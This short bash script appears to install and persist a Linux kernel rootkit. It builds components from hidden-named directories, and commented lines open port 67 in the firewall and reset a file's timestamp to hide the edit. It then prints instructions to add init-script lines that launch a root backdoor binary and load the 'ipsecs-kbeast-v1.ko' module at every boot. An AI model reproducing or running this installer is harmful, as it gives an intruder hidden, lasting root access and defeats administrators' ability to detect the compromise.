#!/bin/bash
echo "start"
dir=`pwd`  
cd /usr/_dns4x_
./setup clean
cd $dir
#time=`stat /etc/sysconfig/iptables | grep -i Modify | awk -F. '{print $1}' | awk '{print $2$3}'| awk -F- '{print $1$2$3}' | awk -F: '{print $1$2}'` 
#echo "-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 67 -j ACCEPT">>/etc/sysconfig/iptables
#iptables -A INPUT -p tcp --dport 67 -j ACCEPT  
#iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 67 -j ACCEPT
#service iptables save  
#service iptables restart
echo $time
#touch -t $time /etc/iptables 
./setup build 0
echo "---Do followings:---"
echo "chkconfig --list |grep 3:on"
echo "vi /etc/init.d/***"
echo "---Adde the followings:---"
echo "su - root -c /usr/_sh4x_/_h4x_bd > /dev/null 2>&1"
echo "insmod /usr/_sh4x_/ipsecs-kbeast-v1.ko > /dev/null 2>&1"
echo "---Check iptables---port:67"
echo "vi /etc/sysconfig/iptables"
echo "Then restart with:init 6"